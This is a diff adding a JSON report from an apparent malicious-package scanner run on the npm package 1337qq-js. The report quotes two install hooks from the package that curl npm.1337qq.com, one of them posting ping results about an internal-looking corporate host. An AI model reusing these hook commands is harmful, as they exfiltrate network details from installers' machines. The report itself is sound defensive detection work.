@@ -1,0 +1,27 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "npm-exec-base64": {},
+        "npm-install-script": [
+            {
+                "location": "package/package.json:8",
+                "code": "    \"postinstall\": \"curl http://npm.1337qq.com/postinstall\",\n",
+                "message": "The package.json has a script automatically running when the package is installed"
+            },
+            {
+                "location": "package/package.json:9",
+                "code": "    \"preinstall\": \"curl -F ping=\\\"$(ping -w 3 icms.alibaba-inc.com)\\\" http://npm.1337qq.com/npm\"\n",
+                "message": "The package.json has a script automatically running when the package is installed"
+            }
+        ],
+        "npm-serialize-environment": {},
+        "npm-silent-process-execution": {},
+        "npm-dll-hijacking": {},
+        "npm-steganography": {},
+        "npm-obfuscation": {},
+        "shady-links": {},
+        "npm-exfiltrate-sensitive-data": {}
+    },
+    "path": "./dataset/npm/1337qq-js-1.0.10"
+}
